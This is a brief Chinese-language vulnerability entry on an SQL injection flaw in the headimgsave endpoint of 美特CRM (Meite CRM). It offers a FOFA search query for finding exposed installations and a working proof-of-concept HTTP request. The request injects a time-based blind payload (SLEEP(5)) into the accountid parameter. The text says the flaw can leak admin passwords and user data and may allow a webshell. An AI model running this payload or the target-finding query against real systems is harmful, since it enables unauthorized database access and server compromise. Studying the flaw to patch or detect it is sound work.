## 美特CRM-headimgsave-sql注入漏洞

## 一、漏洞简介
美特CRM headimgsave 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。02搜索引擎

## fofa
```
body="/common/scripts/basic.js"
```

## POC
```
GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1
Host: [已模糊处理]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
```
